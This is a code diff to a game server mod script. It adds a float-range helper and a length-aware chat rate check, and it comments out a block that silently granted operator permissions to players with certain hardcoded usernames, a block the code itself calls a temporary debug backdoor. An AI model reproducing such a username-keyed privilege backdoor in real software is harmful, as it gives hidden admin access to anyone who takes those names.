@@ -31,6 +31,16 @@ def unicode_convert(input):
 		return input.encode('utf-8')
 	return input
 
+def float_range(start, stop, step):
+	#type: (float, float, float) -> list
+	if (step <= 0): raise ValueError("step must be a positive number")
+	step = -step if start > stop else step
+	result = []
+	while (step > 0 and start <= stop) or (step < 0 and start >= stop):
+		result.append(start)
+		start += step
+	return result
+
 class mainServerSystem(serverApi.GetServerSystemCls()):
 	def __init__(self, namespace, systemName):
 		super(mainServerSystem, self).__init__(namespace, systemName)
@@ -162,7 +172,7 @@ class mainServerSystem(serverApi.GetServerSystemCls()):
 										"§e")
 				return
 			current_time = time.time()
-			if self.check_msg(entityId,current_time):
+			if self.check_msg(entityId, current_time, len(args["command"])):
 				self.last_message_time[entityId] = current_time # 更新最后发言时间
 			else:
 				args["cancel"] = True
@@ -170,29 +180,29 @@ class mainServerSystem(serverApi.GetServerSystemCls()):
 			
 	def OnAddPlayer(self, args):
 		compPlayer = CF.CreatePlayer(args['id'])
-		if args["name"] == "王培衡很丁丁":
-			args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 加入了游戏"
-			compPlayer.SetPermissionLevel(2)
-		elif args["name"] == "EGGYLAN_":
-			args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 加入了游戏"
-			compPlayer.SetPermissionLevel(2)
-		elif args["name"] == "EGGYLAN":
-			args["message"] = "§b§l[开发者] §r§eEGGYLAN 加入了游戏"
-			compPlayer.SetPermissionLevel(2)
-		elif args["name"] == "渡鸦哥与陌生人":
-			compPlayer.SetPermissionLevel(2)
+		# if args["name"] == "王培衡很丁丁":
+		# 	args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 加入了游戏"
+		# 	compPlayer.SetPermissionLevel(2)
+		# elif args["name"] == "EGGYLAN_":
+		# 	args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 加入了游戏"
+		# 	compPlayer.SetPermissionLevel(2)
+		# elif args["name"] == "EGGYLAN":
+		# 	args["message"] = "§b§l[开发者] §r§eEGGYLAN 加入了游戏"
+		# 	compPlayer.SetPermissionLevel(2)
+		# elif args["name"] == "渡鸦哥与陌生人":
+		# 	compPlayer.SetPermissionLevel(2)
 		# 临时后门，仅用于调试
 
 		# 创建 ServerPlayer 实例并存储到字典
 		_current_player_dict[args['id']] = ServerPlayer(args['id'])
 
 	def OnRemovePlayer(self, args):
-		if args["name"] == "王培衡很丁丁":
-			args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 离开了游戏"
-		elif args["name"] == "EGGYLAN_":
-			args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 离开了游戏"
-		elif args["name"] == "EGGYLAN":
-			args["message"] = "§b§l[开发者] §r§eEGGYLAN 离开了游戏"
+		# if args["name"] == "王培衡很丁丁":
+		# 	args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 离开了游戏"
+		# elif args["name"] == "EGGYLAN_":
+		# 	args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 离开了游戏"
+		# elif args["name"] == "EGGYLAN":
+		# 	args["message"] = "§b§l[开发者] §r§eEGGYLAN 离开了游戏"
 
 		# 移除 ServerPlayer 实例
 		if args['id'] in _current_player_dict:
